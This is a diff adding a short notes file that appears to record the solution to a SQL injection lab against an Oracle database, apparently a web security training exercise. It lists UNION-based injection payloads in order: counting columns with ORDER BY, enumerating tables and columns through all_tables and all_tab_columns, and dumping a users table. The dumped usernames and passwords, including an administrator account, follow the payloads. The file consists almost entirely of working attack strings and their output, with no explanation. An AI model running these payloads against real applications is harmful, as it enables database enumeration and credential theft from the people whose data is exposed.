@@ -1,0 +1,41 @@
+SELECT * FROM all_tables
+
+SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+
+UNION SELECT 'abc' FROM dual
+
+
+
+' ORDER BY 1--
+' ORDER BY 2--
+
+
+' UNION SELECT NULL,NULL FROM dual--
+' UNION SELECT 'a','a' FROM dual--
+
+
+
+' UNION SELECT table_name,NULL FROM all_tables--
+
+
+USERS_MFBKEZ
+
+
+
+' UNION  SELECT column_name, NULL  FROM  all_tab_columns WHERE table_name = 'USERS_MFBKEZ'--
+
+
+USERNAME_PASCVN
+PASSWORD_EGBCXB
+
+
+' UNION SELECT  USERNAME_PASCVN, PASSWORD_EGBCXB FROM  USERS_MFBKEZ--
+
+
+administrator
+3mgnbks4cep1i4qujyfs
+carlos
+p65vbtrqn5xunr6396p6
+wiener
+h3s7ub79awehvfd7i5az
+
